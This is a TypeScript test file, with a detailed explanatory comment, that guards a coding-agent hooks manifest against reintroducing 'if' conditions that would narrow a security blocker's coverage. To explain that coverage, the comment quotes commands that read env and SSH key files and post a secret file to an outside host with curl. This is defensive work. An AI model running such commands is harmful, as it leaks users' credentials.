/**
 * hooks.json manifest invariants.
 *
 * ISSUE #98 — no group-level `if` condition may be reintroduced into ctk's hooks.json.
 *
 * All 6 `if` conditions were removed in ctk 2.17.1. They had been present since the initial commit.
 * On CC v2.1.220, 4 of the 6 were probed directly and none confined its hook — neither the Bash
 * conditions nor the file-path ones. The other 2 (`PostToolUse[1]`, `PermissionRequest[0]`) are
 * INFERRED, not measured: the first admits no constructible discriminator, the second fires only
 * on a permission dialog. Each hook's own internal guard is the real filter.
 *
 * WHY THEY WERE INERT (established from https://code.claude.com/docs/en/hooks): they were wrong
 * twice over. (1) `if` is a HOOK-HANDLER field — a sibling of `type`/`command` inside the `hooks`
 * array — not a matcher-group field, so at group level the key is never read. (2) `if` "holds
 * exactly one permission rule. There is no `&&`, `||`, or list syntax for combining rules", while
 * every value we shipped was a `||`-joined list.
 *
 * ⚠ THE CORRECT-LOOKING FIX IS THE DANGEROUS ONE. Reading the above, the natural response is to
 * "fix the nesting" — move `if` into each handler and split the lists into one handler per
 * pattern. That is what the CC docs prescribe in general, and it is exactly what must NOT happen
 * here, because it would ACTIVATE confinement that has never been active. This is now the most
 * likely route to the regression — far more likely than a Claude Code change.
 *
 * This is NOT merely dead-config hygiene. Two of the six would be SECURITY REGRESSIONS if the
 * conditions ever took effect:
 *
 *   - PreToolUse[0] gates `bash-combined`, the only path reaching `security-blocker` for BASH
 *     commands (`write-combined` is the other caller, for the write path — see below).
 *     All 20 of its globs were destructive verbs, so a working condition would exclude every
 *     secret-file read — `cat <envfile>`, `curl -d @<envfile> https://…`, `cat ~/.ssh/id_rsa`
 *     match none of them. Those are denied today ONLY because the condition does not confine
 *     the hook.
 *   - PreToolUse[2] gates `write-combined`, which bundles `security-blocker` and the pre-write
 *     secret scan for the write path.
 *
 * So "make the `if` work" is a security regression, not a fix. If you are here because you want
 * to reduce hook invocations: put the condition inside the hook implementation, where it is
 * testable and where a parsing failure cannot silently widen or narrow security coverage. CC's own
 * docs agree on the principle — "the `if` filter is best-effort, use the permission system rather
 * than a hook to enforce a hard allow or deny."
 *
 * Full measurements: docs/reviews/2026-08-01_98-hook-if-condition-cause.md
 *
 * @module tests/hooks-manifest
 */

import * as fs from 'node:fs';
import * as path from 'node:path';
import { describe, expect, it } from 'vitest';

const MANIFEST_PATH = path.join(__dirname, '..', 'hooks.json');

/** Collect the JSON paths of every `if` key anywhere in the manifest. */
function findIfKeys(node: unknown, trail: string[] = []): string[] {
  if (Array.isArray(node)) {
    return node.flatMap((child, i) => findIfKeys(child, [...trail, `[${i}]`]));
  }
  if (node !== null && typeof node === 'object') {
    return Object.entries(node as Record<string, unknown>).flatMap(([key, value]) =>
      key === 'if' ? [[...trail, key].join('.')] : findIfKeys(value, [...trail, key])
    );
  }
  return [];
}

describe('ctk hooks.json manifest', () => {
  it('parses as valid JSON', () => {
    expect(() => JSON.parse(fs.readFileSync(MANIFEST_PATH, 'utf-8'))).not.toThrow();
  });

  it('contains no group-level `if` conditions (issue #98)', () => {
    const manifest = JSON.parse(fs.readFileSync(MANIFEST_PATH, 'utf-8'));
    expect(findIfKeys(manifest)).toEqual([]);
  });

  /**
   * Must-fail control for the assertion above.
   *
   * Without this, `findIfKeys` could be silently broken — always returning [] — and the real
   * assertion would stay green while pinning nothing. That exact failure has shipped in this
   * repo twice (heredoc tests that passed via the comment rule; a snapshot self-diff whose
   * exit-0 path was unreachable). A control that passes without touching the mechanism is not
   * a control, so this proves the detector can actually see an `if` before the green above is
   * allowed to mean anything.
   */
  it('detector control: finds an `if` when one is present', () => {
    const withIf = {
      hooks: {
        PreToolUse: [{ matcher: 'Bash', if: 'Bash(rm *)', hooks: [{ type: 'command' }] }],
      },
    };
    expect(findIfKeys(withIf)).toEqual(['hooks.PreToolUse.[0].if']);
  });

  it('detector control: does not mistake a hook named "if" for a condition key', () => {
    // Guards against a detector that matches on values rather than keys.
    const noIf = {
      hooks: { PreToolUse: [{ matcher: 'Bash', command: 'if [ -f x ]; then :; fi' }] },
    };
    expect(findIfKeys(noIf)).toEqual([]);
  });
});
